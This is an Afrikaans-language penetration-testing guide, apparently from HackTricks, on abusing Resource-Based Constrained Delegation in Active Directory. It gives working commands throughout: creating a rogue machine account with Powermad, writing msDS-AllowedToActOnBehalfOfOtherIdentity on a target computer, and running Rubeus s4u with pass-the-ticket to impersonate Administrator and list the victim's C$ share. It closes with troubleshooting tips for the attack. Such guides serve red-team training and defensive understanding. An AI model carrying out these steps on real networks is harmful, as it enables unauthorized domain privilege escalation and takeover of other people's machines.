# Hulpbron-gebaseerde Beperkte Afvaardiging

{{#include ../../banners/hacktricks-training.md}}


## Basiese beginsels van Hulpbron-gebaseerde Beperkte Afvaardiging

Dit is soortgelyk aan die basiese [Beperkte Afvaardiging](constrained-delegation.md) maar **in plaas daarvan** om toestemmings aan 'n **objek** te gee om **enige gebruiker teen 'n diens te verteenwoordig**. Hulpbron-gebaseerde Beperkte Afvaardiging **stel** in **die objek wie in staat is om enige gebruiker teen dit te verteenwoordig**.

In hierdie geval sal die beperkte objek 'n attribuut hê genaamd _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ met die naam van die gebruiker wat enige ander gebruiker teen dit kan verteenwoordig.

Nog 'n belangrike verskil van hierdie Beperkte Afvaardiging teenoor die ander afvaardigings is dat enige gebruiker met **skryftoestemmings oor 'n masjienrekening** (_GenericAll/GenericWrite/WriteDacl/WriteProperty/etc_) die _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ kan stel (In die ander vorme van Afvaardiging het jy domein admin regte nodig gehad).

### Nuwe Konsepte

Terug by Beperkte Afvaardiging is daar gesê dat die **`TrustedToAuthForDelegation`** vlag binne die _userAccountControl_ waarde van die gebruiker nodig is om 'n **S4U2Self** uit te voer. Maar dit is nie heeltemal waar nie.\
Die werklikheid is dat selfs sonder daardie waarde, jy 'n **S4U2Self** teen enige gebruiker kan uitvoer as jy 'n **diens** (het 'n SPN) is, maar, as jy **`TrustedToAuthForDelegation`** het, sal die teruggegee TGS **Forwardable** wees en as jy **nie het nie** daardie vlag sal die teruggegee TGS **nie** **Forwardable** wees nie.

As die **TGS** wat in **S4U2Proxy** gebruik word **NIE Forwardable** is nie, sal dit **nie werk** om 'n **basiese Beperkte Afvaardiging** te misbruik nie. Maar as jy probeer om 'n **Hulpbron-gebaseerde beperkte afvaardiging te ontgin, sal dit werk** (dit is nie 'n kwesbaarheid nie, dit is 'n kenmerk, blykbaar).

### Aanvalstruktuur

> As jy **skrywequivalente regte** oor 'n **Rekenaar** rekening het, kan jy **bevoorregte toegang** in daardie masjien verkry.

Neem aan dat die aanvaller reeds **skrywequivalente regte oor die slagoffer rekenaar** het.

1. Die aanvaller **kompromitteer** 'n rekening wat 'n **SPN** het of **skep een** (“Diens A”). Let daarop dat **enige** _Admin Gebruiker_ sonder enige ander spesiale regte tot **10** **Rekenaarobjekte** (_**MachineAccountQuota**_) kan **skep** en hulle 'n **SPN** kan stel. So die aanvaller kan net 'n Rekenaarobjek skep en 'n SPN stel.
2. Die aanvaller **misbruik sy SKRYF regte** oor die slagoffer rekenaar (DiensB) om **hulpbron-gebaseerde beperkte afvaardiging te konfigureer om DiensA toe te laat om enige gebruiker** teen daardie slagoffer rekenaar (DiensB) te verteenwoordig.
3. Die aanvaller gebruik Rubeus om 'n **volledige S4U-aanval** (S4U2Self en S4U2Proxy) van Diens A na Diens B vir 'n gebruiker **met bevoorregte toegang tot Diens B** uit te voer.
1. S4U2Self (van die SPN gecompromitteerde/geskepte rekening): Vra vir 'n **TGS van Administrateur na my** (Nie Forwardable).
2. S4U2Proxy: Gebruik die **nie Forwardable TGS** van die vorige stap om vir 'n **TGS** van **Administrateur** na die **slagoffer gasheer** te vra.
3. Selfs al gebruik jy 'n nie Forwardable TGS, aangesien jy Hulpbron-gebaseerde beperkte afvaardiging ontgin, sal dit werk.
4. Die aanvaller kan **pass-the-ticket** en **verteenwoordig** die gebruiker om **toegang tot die slagoffer DiensB** te verkry.

Om die _**MachineAccountQuota**_ van die domein te kontroleer, kan jy gebruik:
```powershell
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```
## Aanval

### Skep 'n Rekenaarobjek

Jy kan 'n rekenaarobjek binne die domein skep met behulp van [powermad](https://github.com/Kevin-Robertson/Powermad)**:**
```powershell
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```
### Konfigurasie van R**esource-gebaseerde Beperkte Afvaardiging**

**Gebruik van activedirectory PowerShell-module**
```powershell
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assing delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```
**Gebruik powerview**
```powershell
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```
### Voer 'n volledige S4U-aanval uit

Eerst het ons die nuwe rekenaarobjek met die wagwoord `123456` geskep, so ons het die hash van daardie wagwoord nodig:
```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```
Dit sal die RC4 en AES hashes vir daardie rekening druk.\
Nou kan die aanval uitgevoer word:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```
U kan meer kaartjies genereer deur net een keer te vra met die `/altservice` parameter van Rubeus:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```
> [!CAUTION]
> Let daarop dat gebruikers 'n attribuut het genaamd "**Kan nie gedelegeer word nie**". As 'n gebruiker hierdie attribuut op Waar het, sal jy nie in staat wees om hom te verpersoonlik nie. Hierdie eienskap kan binne bloodhound gesien word.

### Toegang

Die laaste opdraglyn sal die **volledige S4U-aanval uitvoer en die TGS** van Administrator na die slagoffer-gasheer in **geheue** inspuit.\
In hierdie voorbeeld is 'n TGS vir die **CIFS** diens van Administrator aangevra, so jy sal in staat wees om toegang te verkry tot **C$**:
```bash
ls \\victim.domain.local\C$
```
### Misbruik verskillende dienskaartjies

Leer oor die [**beskikbare dienskaartjies hier**](silver-ticket.md#available-services).

## Kerberos Foute

- **`KDC_ERR_ETYPE_NOTSUPP`**: Dit beteken dat kerberos gekonfigureer is om nie DES of RC4 te gebruik nie en jy verskaf net die RC4-hash. Verskaf aan Rubeus ten minste die AES256-hash (of verskaf net die rc4, aes128 en aes256 hashes). Voorbeeld: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
- **`KRB_AP_ERR_SKEW`**: Dit beteken dat die tyd van die huidige rekenaar verskil van die een van die DC en kerberos werk nie behoorlik nie.
- **`preauth_failed`**: Dit beteken dat die gegewe gebruikersnaam + hashes nie werk om in te log nie. Jy mag dalk vergeet het om die "$" binne die gebruikersnaam te plaas toe jy die hashes genereer (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
- **`KDC_ERR_BADOPTION`**: Dit kan beteken:
  - Die gebruiker wat jy probeer om te verteenwoordig kan nie toegang tot die verlangde diens verkry nie (omdat jy dit nie kan verteenwoordig nie of omdat dit nie genoeg bevoegdhede het nie)
  - Die gevraagde diens bestaan nie (as jy vir 'n kaartjie vir winrm vra maar winrm nie loop nie)
  - Die fakecomputer wat geskep is het sy bevoegdhede oor die kwesbare bediener verloor en jy moet dit teruggee.

## Verwysings

- [https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
- [https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/](https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
- [https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/](https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/)


{{#include ../../banners/hacktricks-training.md}}
